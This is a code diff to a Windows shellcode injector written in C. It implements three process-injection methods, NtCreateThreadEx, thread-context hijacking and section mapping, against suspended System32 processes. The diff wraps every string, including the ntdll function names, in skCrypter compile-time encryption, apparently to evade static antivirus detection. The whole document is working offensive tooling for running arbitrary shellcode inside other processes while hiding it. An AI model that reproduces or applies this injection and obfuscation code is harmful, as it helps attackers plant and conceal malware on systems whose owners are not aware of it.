@@ -2,6 +2,7 @@
 #include <stdio.h>
 #include "addresshunter.h"
 #include "functions.h"
+#include "skCrypter.h"
 
 #pragma warning(disable:4996)
 
@@ -13,23 +14,23 @@ VOID ParseArguments(int argc, char** argv, CHAR* processName, CHAR* shellcodeNam
 	// iterate over the arguments and parse the --process, --shellcode and --size
 	for (int i = 1; i < argc; i++) 
 
-		if (strcmp(argv[i], "--process") == 0) {
+		if (strcmp(argv[i], skCrypt("--process")) == 0) {
 			if (i + 1 < argc) {
 				strncpy_s(processName, MAX_PATH, argv[i + 1], _TRUNCATE);
-				printf("[+] Process name: %s\n", processName);
+				printf(skCrypt("[+] Process name: %s\n"), processName);
 			}
 			else {
-				printf("[-] Invalid process name\n");
+				printf(skCrypt("[-] Invalid process name\n"));
 				exit(1);
 			}
 		}
-		else if (strcmp(argv[i], "--shellcode") == 0) {
+		else if (strcmp(argv[i], skCrypt("--shellcode")) == 0) {
 			if (i + 1 < argc) {
 				strncpy_s(shellcodeName, MAX_PATH, argv[i + 1], _TRUNCATE);
-				printf("[+] Shellcode name: %s\n", shellcodeName);
+				printf(skCrypt("[+] Shellcode name: %s\n"), shellcodeName);
 			}
 			else {
-				printf("[-] Invalid shellcode name\n");
+				printf(skCrypt("[-] Invalid shellcode name\n"));
 				exit(1);
 			}
 		}
@@ -39,20 +40,20 @@ VOID ParseArguments(int argc, char** argv, CHAR* processName, CHAR* shellcodeNam
 BOOL ReadShellcodeFile(CHAR* shellcodeName, LPVOID* shellcode, SIZE_T* shellcodeSize) {
 	HANDLE hFile = CreateFileA(shellcodeName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
-		printf("[-] Failed to open shellcode file\n");
+		printf(skCrypt("[-] Failed to open shellcode file\n"));
 		return FALSE;
 	}
 
 	*shellcodeSize = GetFileSize(hFile, NULL);
 	*shellcode = VirtualAlloc(NULL, *shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (*shellcode == NULL) {
-		printf("[-] Failed to allocate memory for shellcode\n");
+		printf(skCrypt("[-] Failed to allocate memory for shellcode\n"));
 		return FALSE;
 	}
 
 	DWORD bytesRead;
 	if (!ReadFile(hFile, *shellcode, *shellcodeSize, &bytesRead, NULL)) {
-		printf("[-] Failed to read shellcode file\n");
+		printf(skCrypt("[-] Failed to read shellcode file\n"));
 		return FALSE;
 	}
 
@@ -62,12 +63,12 @@ BOOL ReadShellcodeFile(CHAR* shellcodeName, LPVOID* shellcode, SIZE_T* shellcode
 
 BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcodeSize) {
 	
-	_NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)GetSymbolAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
-	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetSymbolAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
-	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetSymbolAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
-	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetSymbolAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
-	_NtResumeThread NtResumeThread = (_NtResumeThread)GetSymbolAddress(GetModuleHandleA("ntdll.dll"), "NtResumeThread");
-	_NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)GetSymbolAddress(GetModuleHandleA("ntdll.dll"), "NtWaitForSingleObject");
+	_NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtCreateThreadEx"));
+	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtAllocateVirtualMemory"));
+	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtWriteVirtualMemory"));
+	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtProtectVirtualMemory"));
+	_NtResumeThread NtResumeThread = (_NtResumeThread)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtResumeThread"));
+	_NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtWaitForSingleObject"));
 
 	NTSTATUS status = STATUS_SUCCESS;
 	HANDLE hReadPipe, hWritePipe;
@@ -79,16 +80,16 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 	saAttr.lpSecurityDescriptor = NULL;
 
 	if(!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
-		printf("[-] Failed to create pipe\n");
+		printf(skCrypt("[-] Failed to create pipe\n"));
 		return FALSE;
 	}
 
 	if(!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0)) {
-		printf("[-] Failed to set handle information\n");
+		printf(skCrypt("[-] Failed to set handle information\n"));
 		return FALSE;
 	}
 
-	printf("[+] Pipe created successfully\n");
+	printf(skCrypt("[+] Pipe created successfully\n"));
 
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
@@ -108,22 +109,22 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 
 
 	char processPath[MAX_PATH];
-	snprintf(processPath, sizeof(processPath), "C:\\Windows\\System32\\%s", processName);
+	snprintf(processPath, sizeof(processPath), skCrypt("C:\\Windows\\System32\\%s"), processName);
 
 	if (!CreateProcessA(processPath, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)) {
-		printf("[-] Failed to create process\n");
+		printf(skCrypt("[-] Failed to create process\n"));
 		CloseHandle(hReadPipe);
 		CloseHandle(hWritePipe);
 
 		return FALSE;
 	}
 
-	printf("[+] Process created successfully\n");
+	printf(skCrypt("[+] Process created successfully\n"));
 
 	// NtAllocateVirutalMemory
 	status = NtAllocateVirtualMemory(pi.hProcess, &remoteBuffer, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (status != STATUS_SUCCESS) {
-		printf("[-] Failed to allocate memory in remote process\n");
+		printf(skCrypt("[-] Failed to allocate memory in remote process\n"));
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 		CloseHandle(hReadPipe);
@@ -131,12 +132,12 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 
 		return FALSE;
 	}
-	printf("[+] Memory allocated successfully\n");
+	printf(skCrypt("[+] Memory allocated successfully\n"));
 
 	DWORD oldProtect;
 	status = NtProtectVirtualMemory(pi.hProcess, &remoteBuffer, (PULONG) & shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
 	if (status != STATUS_SUCCESS) {
-		printf("[-] Failed to change memory protection\n");
+		printf(skCrypt("[-] Failed to change memory protection\n"));
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 		CloseHandle(hReadPipe);
@@ -144,11 +145,11 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 
 		return FALSE;
 	}
-	printf("[+] Memory protection changed successfully\n");
+	printf(skCrypt("[+] Memory protection changed successfully\n"));
 
 	status = NtWriteVirtualMemory(pi.hProcess, remoteBuffer, shellcode, shellcodeSize, NULL);
 	if (status != STATUS_SUCCESS) {
-		printf("[-] Failed to write shellcode to remote process\n");
+		printf(skCrypt("[-] Failed to write shellcode to remote process\n"));
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 		CloseHandle(hReadPipe);
@@ -156,7 +157,7 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 
 		return FALSE;
 	}
-	printf("[+] Shellcode written successfully\n");
+	printf(skCrypt("[+] Shellcode written successfully\n"));
 	
 	HANDLE hThread = NULL;
 
@@ -174,9 +175,9 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 		NULL
 	);
 	if (status != STATUS_SUCCESS) {
-		printf("[-] Failed to create remote thread\n");
-		printf("[-] Error code: %x\n", status);
-		printf("[-] Last Error: %d\n", GetLastError());
+		printf(skCrypt("[-] Failed to create remote thread\n"));
+		printf(skCrypt("[-] Error code: %x\n"), status);
+		printf(skCrypt("[-] Last Error: %d\n"), GetLastError());
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 		CloseHandle(hReadPipe);
@@ -184,11 +185,11 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 
 		return FALSE;
 	}
-	printf("[+] Remote thread created successfully\n");
+	printf(skCrypt("[+] Remote thread created successfully\n"));
 
 	status = NtResumeThread(hThread, NULL);
 	if (status != STATUS_SUCCESS) {
-		printf("[-] Failed to resume thread\n");
+		printf(skCrypt("[-] Failed to resume thread\n"));
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 		CloseHandle(hReadPipe);
@@ -197,7 +198,7 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 
 		return FALSE;
 	}
-	printf("[+] Thread resumed successfully\n");
+	printf(skCrypt("[+] Thread resumed successfully\n"));
 
 	if(hThread != NULL) {
 		LARGE_INTEGER timeout;
@@ -205,8 +206,8 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 
 		status = NtWaitForSingleObject(hThread, FALSE, NULL);
 
-		printf("[+] Thread finished successfully\n");
-		printf("[+] Shellcode executed successfully\n");
+		printf(skCrypt("[+] Thread finished successfully\n"));
+		printf(skCrypt("[+] Shellcode executed successfully\n"));
 
 		CloseHandle(hWritePipe);
 
@@ -216,7 +217,7 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 		HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
 		CHAR *output = (CHAR*)malloc(1);
 		if (output == NULL) {
-			printf("[-] Failed to allocate memory\n");
+			printf(skCrypt("[-] Failed to allocate memory\n"));
 			return FALSE;
 		}
 		output[0] = '\0';
@@ -227,7 +228,7 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 			chBuf[dwRead] = '\0';
 			CHAR *new_output = (CHAR*)realloc(output, strlen(output) + dwRead + 2);
 			if (new_output == NULL) {
-				printf("[-] Failed to allocate memory\n");
+				printf(skCrypt("[-] Failed to allocate memory\n"));
 				free(output);
 				return FALSE;
 			}
@@ -235,7 +236,7 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 			strncat(output, chBuf, dwRead);
 		}
 		output[strlen(output)] = '\0';
-		printf("[+] Shellcode Output:\n%s\n", output);
+		printf(skCrypt("[+] Shellcode Output:\n%s\n"), output);
 		free(output);
 	}
 
@@ -252,13 +253,13 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 
 BOOL InjectThreadHijacking(CHAR* processName, LPVOID shellcode, SIZE_T shellcodeSize) {
 	
-	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetSymbolAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
-	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetSymbolAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
-	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetSymbolAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
-	_NtResumeThread NtResumeThread = (_NtResumeThread)GetSymbolAddress(GetModuleHandleA("ntdll.dll"), "NtResumeThread");
-	_NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)GetSymbolAddress(GetModuleHandleA("ntdll.dll"), "NtWaitForSingleObject");
-	_NtGetContextThread NtGetContextThread = (_NtGetContextThread)GetSymbolAddress(GetModuleHandleA("ntdll.dll"), "NtGetContextThread");
-	_NtSetContextThread NtSetContextThread = (_NtSetContextThread)GetSymbolAddress(GetModuleHandleA("ntdll.dll"), "NtSetContextThread");
+	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtAllocateVirtualMemory"));
+	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtWriteVirtualMemory"));
+	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtProtectVirtualMemory"));
+	_NtResumeThread NtResumeThread = (_NtResumeThread)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtResumeThread"));
+	_NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtWaitForSingleObject"));
+	_NtGetContextThread NtGetContextThread = (_NtGetContextThread)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtGetContextThread"));
+	_NtSetContextThread NtSetContextThread = (_NtSetContextThread)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtSetContextThread"));
 
 	NTSTATUS status = STATUS_SUCCESS;
 	HANDLE hReadPipe, hWritePipe;
@@ -270,16 +271,16 @@ BOOL InjectThreadHijacking(CHAR* processName, LPVOID shellcode, SIZE_T shellcode
 	saAttr.lpSecurityDescriptor = NULL;
 
 	if(!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
-		printf("[-] Failed to create pipe\n");
+		printf(skCrypt("[-] Failed to create pipe\n"));
 		return FALSE;
 	}
 
 	if(!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0)) {
-		printf("[-] Failed to set handle information\n");
+		printf(skCrypt("[-] Failed to set handle information\n"));
 		return FALSE;
 	}
 
-	printf("[+] Pipe created successfully\n");
+	printf(skCrypt("[+] Pipe created successfully\n"));
 
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
@@ -297,22 +298,22 @@ BOOL InjectThreadHijacking(CHAR* processName, LPVOID shellcode, SIZE_T shellcode
 	LPVOID remoteBuffer = NULL;
 
 	char processPath[MAX_PATH];
-	snprintf(processPath, sizeof(processPath), "C:\\Windows\\System32\\%s", processName);
+	snprintf(processPath, sizeof(processPath), skCrypt("C:\\Windows\\System32\\%s"), processName);
 
 	if (!CreateProcessA(processPath, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)) {
-		printf("[-] Failed to create process\n");
+		printf(skCrypt("[-] Failed to create process\n"));
 		CloseHandle(hReadPipe);
 		CloseHandle(hWritePipe);
 
 		return FALSE;
 	}
 
-	printf("[+] Process created successfully\n");
+	printf(skCrypt("[+] Process created successfully\n"));
 
 	// NtAllocateVirutalMemory
 	status = NtAllocateVirtualMemory(pi.hProcess, &remoteBuffer, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (status != STATUS_SUCCESS) {
-		printf("[-] Failed to allocate memory in remote process\n");
+		printf(skCrypt("[-] Failed to allocate memory in remote process\n"));
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 		CloseHandle(hReadPipe);
@@ -320,12 +321,12 @@ BOOL InjectThreadHijacking(CHAR* processName, LPVOID shellcode, SIZE_T shellcode
 
 		return FALSE;
 	}
-	printf("[+] Memory allocated successfully\n");
+	printf(skCrypt("[+] Memory allocated successfully\n"));
 
 	DWORD oldProtect;
 	status = NtProtectVirtualMemory(pi.hProcess, &remoteBuffer, (PULONG) & shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
 	if (status != STATUS_SUCCESS) {
-		printf("[-] Failed to change memory protection\n");
+		printf(skCrypt("[-] Failed to change memory protection\n"));
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 		CloseHandle(hReadPipe);
@@ -333,11 +334,11 @@ BOOL InjectThreadHijacking(CHAR* processName, LPVOID shellcode, SIZE_T shellcode
 
 		return FALSE;
 	}
-	printf("[+] Memory protection changed successfully\n");
+	printf(skCrypt("[+] Memory protection changed successfully\n"));
 
 	status = NtWriteVirtualMemory(pi.hProcess, remoteBuffer, shellcode, shellcodeSize, NULL);
 	if (status != STATUS_SUCCESS) {
-		printf("[-] Failed to write shellcode to remote process\n");
+		printf(skCrypt("[-] Failed to write shellcode to remote process\n"));
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 		CloseHandle(hReadPipe);
@@ -345,13 +346,13 @@ BOOL InjectThreadHijacking(CHAR* processName, LPVOID shellcode, SIZE_T shellcode
 
 		return FALSE;
 	}
-	printf("[+] Shellcode written successfully\n");
+	printf(skCrypt("[+] Shellcode written successfully\n"));
 
 	CONTEXT ctx;
 	ctx.ContextFlags = CONTEXT_FULL;
 	status = NtGetContextThread(pi.hThread, &ctx);
 	if (status != STATUS_SUCCESS) {
-		printf("[-] Failed to get thread context\n");
+		printf(skCrypt("[-] Failed to get thread context\n"));
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 		CloseHandle(hReadPipe);
@@ -359,11 +360,11 @@ BOOL InjectThreadHijacking(CHAR* processName, LPVOID shellcode, SIZE_T shellcode
 
 		return FALSE;
 	}
-	printf("[+] Thread context retrieved successfully\n");
+	printf(skCrypt("[+] Thread context retrieved successfully\n"));
 	ctx.Rip = (DWORD64)remoteBuffer;
 	status = NtSetContextThread(pi.hThread, &ctx);
 	if (status != STATUS_SUCCESS) {
-		printf("[-] Failed to set thread context\n");
+		printf(skCrypt("[-] Failed to set thread context\n"));
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 		CloseHandle(hReadPipe);
@@ -371,10 +372,10 @@ BOOL InjectThreadHijacking(CHAR* processName, LPVOID shellcode, SIZE_T shellcode
 
 		return FALSE;
 	}
-	printf("[+] Thread context set successfully\n");
+	printf(skCrypt("[+] Thread context set successfully\n"));
 	status = NtResumeThread(pi.hThread, NULL);
 	if (status != STATUS_SUCCESS) {
-		printf("[-] Failed to resume thread\n");
+		printf(skCrypt("[-] Failed to resume thread\n"));
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 		CloseHandle(hReadPipe);
@@ -382,7 +383,7 @@ BOOL InjectThreadHijacking(CHAR* processName, LPVOID shellcode, SIZE_T shellcode
 
 		return FALSE;
 	}
-	printf("[+] Thread resumed successfully\n");
+	printf(skCrypt("[+] Thread resumed successfully\n"));
 
 	if (pi.hThread != NULL) {
 		LARGE_INTEGER timeout;
@@ -390,8 +391,8 @@ BOOL InjectThreadHijacking(CHAR* processName, LPVOID shellcode, SIZE_T shellcode
 
 		status = NtWaitForSingleObject(pi.hThread, FALSE, &timeout);
 		
-		printf("[+] Thread finished successfully\n");
-		printf("[+] Shellcode executed successfully\n");
+		printf(skCrypt("[+] Thread finished successfully\n"));
+		printf(skCrypt("[+] Shellcode executed successfully\n"));
 
 		CloseHandle(hWritePipe);
 
@@ -401,7 +402,7 @@ BOOL InjectThreadHijacking(CHAR* processName, LPVOID shellcode, SIZE_T shellcode
 		HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
 		CHAR *output = (CHAR*)malloc(1);
 		if (output == NULL) {
-			printf("[-] Failed to allocate memory\n");
+			printf(skCrypt("[-] Failed to allocate memory\n"));
 			return FALSE;
 		}
 		output[0] = '\0';
@@ -412,7 +413,7 @@ BOOL InjectThreadHijacking(CHAR* processName, LPVOID shellcode, SIZE_T shellcode
 			chBuf[dwRead] = '\0';
 			CHAR *new_output = (CHAR*)realloc(output, strlen(output) + dwRead + 2);
 			if (new_output == NULL) {
-				printf("[-] Failed to allocate memory\n");
+				printf(skCrypt("[-] Failed to allocate memory\n"));
 				free(output);
 				return FALSE;
 			}
@@ -420,7 +421,7 @@ BOOL InjectThreadHijacking(CHAR* processName, LPVOID shellcode, SIZE_T shellcode
 			strncat(output, chBuf, dwRead);
 		}
 		output[strlen(output)] = '\0';
-		printf("[+] Shellcode Output:\n%s\n", output);
+		printf(skCrypt("[+] Shellcode Output:\n%s\n"), output);
 		free(output);
 	} 
 
@@ -436,13 +437,13 @@ BOOL InjectThreadHijacking(CHAR* processName, LPVOID shellcode, SIZE_T shellcode
 
 BOOL InjectNtMapViewOfSection(CHAR* processName, LPVOID shellcode, SIZE_T shellcodeSize) {
 	
-	_NtMapViewOfSection NtMapViewOfSection = (_NtMapViewOfSection)GetSymbolAddress(GetModuleHandleA("ntdll.dll"), "NtMapViewOfSection");
-	_NtCreateSection NtCreateSection = (_NtCreateSection)GetSymbolAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
-	_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)GetSymbolAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
-	_NtGetContextThread NtGetContextThread = (_NtGetContextThread)GetSymbolAddress(GetModuleHandleA("ntdll.dll"), "NtGetContextThread");
-	_NtSetContextThread NtSetContextThread = (_NtSetContextThread)GetSymbolAddress(GetModuleHandleA("ntdll.dll"), "NtSetContextThread");
-	_NtResumeThread NtResumeThread = (_NtResumeThread)GetSymbolAddress(GetModuleHandleA("ntdll.dll"), "NtResumeThread");
-	_NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)GetSymbolAddress(GetModuleHandleA("ntdll.dll"), "NtWaitForSingleObject");
+	_NtMapViewOfSection NtMapViewOfSection = (_NtMapViewOfSection)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtMapViewOfSection"));
+	_NtCreateSection NtCreateSection = (_NtCreateSection)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtCreateSection"));
+	_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtUnmapViewOfSection"));
+	_NtGetContextThread NtGetContextThread = (_NtGetContextThread)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtGetContextThread"));
+	_NtSetContextThread NtSetContextThread = (_NtSetContextThread)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtSetContextThread"));
+	_NtResumeThread NtResumeThread = (_NtResumeThread)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtResumeThread"));
+	_NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)GetSymbolAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtWaitForSingleObject"));
 
 	NTSTATUS status = STATUS_SUCCESS;
 	HANDLE hReadPipe, hWritePipe;
@@ -454,16 +455,16 @@ BOOL InjectNtMapViewOfSection(CHAR* processName, LPVOID shellcode, SIZE_T shellc
 	saAttr.lpSecurityDescriptor = NULL;
 
 	if(!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
-		printf("[-] Failed to create pipe\n");
+		printf(skCrypt("[-] Failed to create pipe\n"));
 		return FALSE;
 	}
 
 	if(!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0)) {
-		printf("[-] Failed to set handle information\n");
+		printf(skCrypt("[-] Failed to set handle information\n"));
 		return FALSE;
 	}
 
-	printf("[+] Pipe created successfully\n");
+	printf(skCrypt("[+] Pipe created successfully\n"));
 
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
@@ -479,22 +480,22 @@ BOOL InjectNtMapViewOfSection(CHAR* processName, LPVOID shellcode, SIZE_T shellc
 	ZeroMemory(&pi, sizeof(pi));
 	char processPath[MAX_PATH];
 	
-	snprintf(processPath, sizeof(processPath), "C:\\Windows\\System32\\%s", processName);
+	snprintf(processPath, sizeof(processPath), skCrypt("C:\\Windows\\System32\\%s"), processName);
 	
 	if (!CreateProcessA(processPath, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)) {
-		printf("[-] Failed to create process\n");
+		printf(skCrypt("[-] Failed to create process\n"));
 		CloseHandle(hReadPipe);
 		CloseHandle(hWritePipe);
 
 		return FALSE;
 	}
 
-	printf("[+] Process created successfully\n");
+	printf(skCrypt("[+] Process created successfully\n"));
 	HANDLE hSection = NULL;
 	LARGE_INTEGER sectionSize = { shellcodeSize };
 	status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
 	if (status != STATUS_SUCCESS) {
-		printf("[-] Failed to create section\n");
+		printf(skCrypt("[-] Failed to create section\n"));
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 		CloseHandle(hReadPipe);
@@ -503,7 +504,7 @@ BOOL InjectNtMapViewOfSection(CHAR* processName, LPVOID shellcode, SIZE_T shellc
 		return FALSE;
 
 	}
-	printf("[+] Section created successfully\n");
+	printf(skCrypt("[+] Section created successfully\n"));
 	PVOID localBuffer = NULL;
 	SIZE_T viewSize = 0;
 	status = NtMapViewOfSection(
@@ -520,7 +521,7 @@ BOOL InjectNtMapViewOfSection(CHAR* processName, LPVOID shellcode, SIZE_T shellc
 	);
 
 	if (status != STATUS_SUCCESS) {
-		printf("[-] Failed to map section\n");
+		printf(skCrypt("[-] Failed to map section\n"));
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 		CloseHandle(hReadPipe);
@@ -529,7 +530,7 @@ BOOL InjectNtMapViewOfSection(CHAR* processName, LPVOID shellcode, SIZE_T shellc
 		return FALSE;
 
 	}
-	printf("[+] Section mapped successfully\n");
+	printf(skCrypt("[+] Section mapped successfully\n"));
 	CopyMemoryEx(localBuffer, shellcode, shellcodeSize);
 
 	PVOID remoteBuffer = NULL;
@@ -547,7 +548,7 @@ BOOL InjectNtMapViewOfSection(CHAR* processName, LPVOID shellcode, SIZE_T shellc
 	);
 
 	if (status != STATUS_SUCCESS) {
-		printf("[-] Failed to map section\n");
+		printf(skCrypt("[-] Failed to map section\n"));
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 		CloseHandle(hReadPipe);
@@ -556,7 +557,7 @@ BOOL InjectNtMapViewOfSection(CHAR* processName, LPVOID shellcode, SIZE_T shellc
 		return FALSE;
 
 	}
-	printf("[+] Section mapped successfully\n");
+	printf(skCrypt("[+] Section mapped successfully\n"));
 	CONTEXT ctx;
 	ctx.ContextFlags = CONTEXT_FULL;
 	
@@ -566,7 +567,7 @@ BOOL InjectNtMapViewOfSection(CHAR* processName, LPVOID shellcode, SIZE_T shellc
 
 	status = NtResumeThread(pi.hThread, NULL);
 	if (status != STATUS_SUCCESS) {
-		printf("[-] Failed to resume thread\n");
+		printf(skCrypt("[-] Failed to resume thread\n"));
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 		CloseHandle(hReadPipe);
@@ -575,7 +576,7 @@ BOOL InjectNtMapViewOfSection(CHAR* processName, LPVOID shellcode, SIZE_T shellc
 		return FALSE;
 	}
 
-	printf("[+] Thread resumed successfully\n");
+	printf(skCrypt("[+] Thread resumed successfully\n"));
 
 	if(pi.hThread != NULL) {
 		LARGE_INTEGER timeout;
@@ -583,8 +584,8 @@ BOOL InjectNtMapViewOfSection(CHAR* processName, LPVOID shellcode, SIZE_T shellc
 
 		status = NtWaitForSingleObject(pi.hThread, FALSE, &timeout);
 
-		printf("[+] Thread finished successfully\n");
-		printf("[+] Shellcode executed successfully\n");
+		printf(skCrypt("[+] Thread finished successfully\n"));
+		printf(skCrypt("[+] Shellcode executed successfully\n"));
 
 		CloseHandle(hWritePipe);
 
@@ -594,7 +595,7 @@ BOOL InjectNtMapViewOfSection(CHAR* processName, LPVOID shellcode, SIZE_T shellc
 		HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
 		CHAR *output = (CHAR*)malloc(1);
 		if (output == NULL) {
-			printf("[-] Failed to allocate memory\n");
+			printf(skCrypt("[-] Failed to allocate memory\n"));
 			return FALSE;
 		}
 		output[0] = '\0';
@@ -605,7 +606,7 @@ BOOL InjectNtMapViewOfSection(CHAR* processName, LPVOID shellcode, SIZE_T shellc
 			chBuf[dwRead] = '\0';
 			CHAR *new_output = (CHAR*)realloc(output, strlen(output) + dwRead + 2);
 			if (new_output == NULL) {
-				printf("[-] Failed to allocate memory\n");
+				printf(skCrypt("[-] Failed to allocate memory\n"));
 				free(output);
 				return FALSE;
 			}
@@ -613,7 +614,7 @@ BOOL InjectNtMapViewOfSection(CHAR* processName, LPVOID shellcode, SIZE_T shellc
 			strncat(output, chBuf, dwRead);
 		}
 		output[strlen(output)] = '\0';
-		printf("[+] Shellcode Output:\n%s\n", output);
